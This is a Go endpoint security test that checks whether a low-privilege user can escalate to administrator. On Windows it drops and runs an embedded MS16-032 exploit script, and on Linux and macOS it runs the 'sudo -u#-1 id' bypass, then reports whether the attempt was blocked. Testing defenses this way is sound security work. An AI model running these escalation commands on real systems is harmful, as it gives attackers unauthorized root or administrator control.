/*
ID: d36c6715-ac9d-4d22-b6d3-cc778dac473b
NAME: Can a low priv user privilege escalate to an administrator?
CREATED: 2023-02-15 12:26:17.091000
*/
package main

import (
	_ "embed"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	Endpoint "github.com/preludeorg/test/endpoint"
)

//go:embed Invoke-MS16032.ps1
var ms16032 []byte
var dir, _ = os.Getwd()
var path = filepath.Join(dir, "Invoke-MS16032.ps1")

var supported = map[string][]string{
	"windows": {"powershell.exe", "-c", path},
	"darwin":  {"bash", "-c", "sudo -u#-1 id"},
	"linux":   {"bash", "-c", "sudo -u#-1 id"},
}

func test() {
	command := supported[runtime.GOOS]
	if runtime.GOOS == "windows" {
		Endpoint.Write(path, ms16032)
	}
	cmd := Endpoint.Shell(command)
	if strings.Contains(cmd, "1") {
		println("[+] The test was prevented or machine not vulnerable")
		Endpoint.Stop(107)
	}
	println("[-] Test was not prevented")
	Endpoint.Stop(101)
}

func clean() {
	if runtime.GOOS == "windows" {
		Endpoint.Remove(path)
	}
	Endpoint.Stop(100)
}

func main() {
	Endpoint.Start(test, clean)
}